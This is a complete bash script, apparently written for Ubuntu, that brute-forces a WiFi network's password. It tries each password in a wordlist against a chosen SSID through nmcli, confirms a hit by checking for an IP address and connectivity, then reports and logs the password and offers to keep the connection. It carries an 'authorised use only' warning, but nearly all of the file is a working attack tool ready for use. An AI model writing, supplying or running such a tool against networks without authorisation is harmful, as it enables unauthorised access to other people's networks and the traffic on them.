#!/bin/bash

# WiFi Password Auditing Tool for Ubuntu
# WARNING: Only use on networks you own or have explicit authorization to test
# Usage: ./wifi-bruteforce.sh <SSID> <WORDLIST_FILE>

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Check if running with sudo
if [ "$EUID" -ne 0 ]; then
    echo -e "${RED}Error: This script must be run with sudo${NC}"
    echo "Usage: sudo ./wifi-bruteforce.sh <SSID> <WORDLIST_FILE>"
    exit 1
fi

# Check if required arguments are provided
if [ $# -lt 2 ]; then
    echo -e "${RED}Error: Missing arguments${NC}"
    echo "Usage: sudo ./wifi-bruteforce.sh <SSID> <WORDLIST_FILE>"
    echo "Example: sudo ./wifi-bruteforce.sh MyWiFi /path/to/passwords.txt"
    exit 1
fi

SSID="$1"
WORDLIST="$2"

# Check if wordlist file exists
if [ ! -f "$WORDLIST" ]; then
    echo -e "${RED}Error: Wordlist file '$WORDLIST' not found${NC}"
    exit 1
fi

# Check if NetworkManager is available
if ! command -v nmcli &> /dev/null; then
    echo -e "${RED}Error: nmcli (NetworkManager) is not installed${NC}"
    echo "Install it with: sudo apt install network-manager"
    exit 1
fi

# Get WiFi interface
WIFI_INTERFACE=$(nmcli device status | awk '/wifi/ {print $1}' | head -1)
if [ -z "$WIFI_INTERFACE" ]; then
    echo -e "${RED}Error: No WiFi interface found${NC}"
    exit 1
fi

# Legal disclaimer
echo -e "${YELLOW}=========================================${NC}"
echo -e "${YELLOW}WiFi Password Security Auditing Tool${NC}"
echo -e "${YELLOW}=========================================${NC}"
echo -e "${RED}WARNING: Only use on networks you own!${NC}"
echo -e "${RED}Unauthorized access is illegal.${NC}"
echo -e "${YELLOW}=========================================${NC}"
echo ""
echo -e "Target SSID: ${BLUE}$SSID${NC}"
echo -e "Wordlist: ${BLUE}$WORDLIST${NC}"
echo -e "Interface: ${BLUE}$WIFI_INTERFACE${NC}"
echo ""

# Count passwords in wordlist
TOTAL_PASSWORDS=$(wc -l < "$WORDLIST")
echo -e "Total passwords to try: ${BLUE}$TOTAL_PASSWORDS${NC}"
echo ""

# Confirm before starting
read -p "Continue with password testing? (yes/no): " CONFIRM
if [ "$CONFIRM" != "yes" ]; then
    echo "Aborted by user."
    exit 0
fi

echo ""
echo -e "${YELLOW}Starting password testing...${NC}"
echo ""

# Log file
LOG_FILE="wifi-audit-$(date +%Y%m%d-%H%M%S).log"
echo "WiFi Password Audit Log - $(date)" > "$LOG_FILE"
echo "Target SSID: $SSID" >> "$LOG_FILE"
echo "Interface: $WIFI_INTERFACE" >> "$LOG_FILE"
echo "Wordlist: $WORDLIST" >> "$LOG_FILE"
echo "----------------------------------------" >> "$LOG_FILE"

# Counter
ATTEMPT=0
FOUND=false

# Disconnect from any current network
echo -e "${BLUE}Disconnecting from current networks...${NC}"
nmcli device disconnect "$WIFI_INTERFACE" 2>/dev/null
nmcli radio wifi off
sleep 2
nmcli radio wifi on
sleep 3

# Function to test connection
test_connection() {
    # Try to ping a reliable host (Google DNS)
    ping -c 1 -W 2 8.8.8.8 &>/dev/null
    return $?
}

# Try each password
while IFS= read -r PASSWORD || [ -n "$PASSWORD" ]; do
    # Skip empty lines and trim whitespace
    PASSWORD=$(echo "$PASSWORD" | sed -e 's/^[[:space:]]*//' -e 's/[[:space:]]*$//')
    if [ -z "$PASSWORD" ]; then
        continue
    fi

    ATTEMPT=$((ATTEMPT + 1))

    # Progress indicator
    echo -ne "${BLUE}[${ATTEMPT}/${TOTAL_PASSWORDS}]${NC} Trying: ${YELLOW}${PASSWORD}${NC}\r"

    # Disconnect first to ensure clean state
    nmcli device disconnect "$WIFI_INTERFACE" &>/dev/null
    sleep 1

    # Attempt connection - use single quotes to handle special characters
    # Create a temporary connection profile
    CONN_NAME="temp-wifi-$$"
    
    # Try to connect
    nmcli device wifi connect "$SSID" password "$PASSWORD" ifname "$WIFI_INTERFACE" name "$CONN_NAME" &>/tmp/nmcli_output.$$
    
    # Check if connection was created
    if nmcli connection show | grep -q "$CONN_NAME"; then
        # Wait for connection to establish
        sleep 3
        
        # Check if we got an IP address
        IP_ADDR=$(nmcli -f IP4.ADDRESS connection show "$CONN_NAME" 2>/dev/null | grep -oP '\d+\.\d+\.\d+\.\d+' | head -1)
        
        if [ -n "$IP_ADDR" ]; then
            # Test actual connectivity
            if test_connection; then
                echo -e "\n${GREEN}=========================================${NC}"
                echo -e "${GREEN}SUCCESS! Password found!${NC}"
                echo -e "${GREEN}=========================================${NC}"
                echo -e "SSID: ${BLUE}$SSID${NC}"
                echo -e "Password: ${GREEN}$PASSWORD${NC}"
                echo -e "IP Address: ${BLUE}$IP_ADDR${NC}"
                echo -e "${GREEN}=========================================${NC}"

                # Log success
                echo "SUCCESS - Password found: $PASSWORD" >> "$LOG_FILE"
                echo "Attempt number: $ATTEMPT" >> "$LOG_FILE"
                echo "IP Address: $IP_ADDR" >> "$LOG_FILE"

                FOUND=true
                
                # Clean up temp connection but keep it for reference
                nmcli connection delete "$CONN_NAME" &>/dev/null
                
                break
            fi
        fi
    fi
    
    # Log failed attempt
    echo "FAILED - Attempt $ATTEMPT: $PASSWORD" >> "$LOG_FILE"
    
    # Clean up any leftover connection
    nmcli connection delete "$CONN_NAME" &>/dev/null 2>&1
    
    # Small delay between attempts
    sleep 1

done < "$WORDLIST"

# Clean up temp file
rm -f /tmp/nmcli_output.$$

echo ""
echo ""

# Final summary
if [ "$FOUND" = true ]; then
    echo -e "${GREEN}Audit completed - Password found after $ATTEMPT attempts${NC}"
    echo -e "${GREEN}Password: $PASSWORD${NC}"
    
    # Optional: reconnect to the network
    echo ""
    read -p "Keep connection to this network? (yes/no): " KEEP_CONN
    if [ "$KEEP_CONN" = "yes" ]; then
        nmcli device wifi connect "$SSID" password "$PASSWORD"
    else
        nmcli device disconnect "$WIFI_INTERFACE"
    fi
else
    echo -e "${RED}Audit completed - Password not found${NC}"
    echo -e "${YELLOW}Tried $ATTEMPT passwords from the wordlist${NC}"
    echo "The password may not be in your wordlist."
    
    # Restore normal WiFi operation
    nmcli radio wifi on
    nmcli device connect "$WIFI_INTERFACE" &>/dev/null
fi

echo ""
echo -e "Full log saved to: ${BLUE}$LOG_FILE${NC}"
echo ""
